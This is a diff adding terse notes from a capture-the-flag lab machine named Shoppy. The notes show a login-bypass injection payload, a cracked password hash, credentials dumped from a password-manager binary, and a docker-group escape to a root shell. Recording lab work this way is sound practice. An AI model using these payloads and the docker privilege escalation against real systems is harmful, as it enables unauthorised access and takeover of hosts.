@@ -82,4 +82,64 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 117.17 seconds
 ```
+http://shoppy.htb/login
 
+https://book.hacktricks.xyz/pentesting-web/login-bypass
+
+admin'||'1==1
+
+6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
+
+josh credentials
+
+http://mattermost.shoppy.htb
+
+cat password-manager
+
+jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+jaeger@shoppy:/home/deploy$ ^C
+jaeger@shoppy:/home/deploy$ su Deploy
+su: user Deploy does not exist or the user entry does not contain all the required fields
+jaeger@shoppy:/home/deploy$ su deploy
+Password: 
+$ bash
+deploy@shoppy:~$ ls
+creds.txt  password-manager  password-manager.cpp
+deploy@shoppy:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for deploy: 
+Sorry, user deploy may not run sudo on shoppy.
+
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════                              
+                               ╚═══════════════════╝                                                             
+OS: Linux version 5.10.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.140-1 (2022-09-02)
+User & Groups: uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+
+
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group
+
+```
+deploy@shoppy:/tmp$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
+alpine       latest    d7d3d98c851f   2 months ago   5.53MB
+deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt alpine chroot /mnt bashbashchroot: can't execute 'bashbash': No such file or directory
+deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt alpine chroot /mnt bash
+root@shoppy:/# cat /root/root.txt
+c5a7****************************
+```
